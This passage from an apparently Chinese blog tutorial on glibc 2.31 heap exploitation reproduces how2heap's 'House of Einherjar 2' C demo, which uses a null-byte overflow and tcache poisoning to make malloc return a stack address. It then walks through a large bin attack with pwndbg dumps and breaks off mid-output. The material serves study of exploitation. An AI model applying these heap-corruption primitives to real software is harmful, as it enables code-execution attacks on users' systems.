class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This modification to The House of Enherjar works with the tcache-option enabled on glibc-2.31.</span></span><br><span class="line"><span class="comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">     * It has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">     * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *) &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">    a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">    a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *b = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *c = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>* c_size_ptr = (<span class="keyword">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">    b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">           <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">           <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">    *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">    a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tcache poisoning</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">    d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(e == stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-large-bin-attack"><a href="#5-large-bin-attack" class="headerlink" title="5. large_bin_attack"></a>5. large_bin_attack</h3><p>通过该技术向目标地址写入一个大值</p><p>2.30 之后关于 largs bin 的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加了两个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted </span></span><br><span class="line"><span class="string">(nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>导致传统的 large bin attack 没法使用</p><p>但是存在一个新的利用路径: </p><p>首先布置如下的 heap </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x430</span>                Used                None              None</span><br><span class="line"><span class="number">0x5555555596c0</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555596e0</span>      <span class="number">0x0</span>                 <span class="number">0x420</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b00</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>0x20 的为  guard chunk ，避免 free 之后 chunk 合并 , 然后我们free p1，此时 chunk p1 会放入 unsortedbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">54</span>   <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line">   <span class="number">55</span></span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line"> ► <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">   <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">64</span></span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe280</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe288</span> —▸ <span class="number">0x5555555592a0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555559b20</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe290</span> —▸ <span class="number">0x5555555596d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe298</span> —▸ <span class="number">0x5555555596f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe2a0</span> —▸ <span class="number">0x555555559b10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe2a8</span> —▸ <span class="number">0x555555555140</span> (_start) ◂— endbr64</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe2b0</span> —▸ <span class="number">0x7fffffffe3b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe2b8</span> ◂— <span class="number">0xf7624ffb64d1fe00</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">5555555553f</span>a main+<span class="number">465</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559290</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure><p>然后我们再  malloc 一个比 p1 大的 chunk，此时 p1 会被放入到 lagrebin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/large_bin_attack.c</span><br><span class="line">   <span class="number">56</span>   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   <span class="number">57</span></span><br><span class="line">   <span class="number">58</span>   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="number">59</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">60</span>   <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"> ► <span class="number">61</span>   <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line">   <span class="number">62</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) ◂— <span class="number">0x555555559290</span></span><br></pre></td></tr></table></figure><p>然后我们在 free p2  ( p2 大小小于 p1 h和 p3) , 此时 p2 就会被放入到 unsortedbin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">65</span>   <span class="built_in">free</span>(p2);</span><br><span class="line"> ► <span class="number">66</span>   <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">   <span class="number">67</span>   <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">   <span class="number">68</span>   <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555555596e0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555555596e0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x555555559290</span> —▸ <span class="number">0x7ffff7fb0fd0</span> (main_arena+<span class="number">1104</span>) ◂— <span class="number">0x555555559290</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们修改 p1 的 bk_nextsize 指向 target-0x20 , 此时的 p1 在 largebin 里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">72</span>   p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">   <span class="number">73</span>   <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx p1<span class="number">-2</span></span><br><span class="line"><span class="number">0x555555559290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000431</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x00007ffff7fb0fd0</span><span 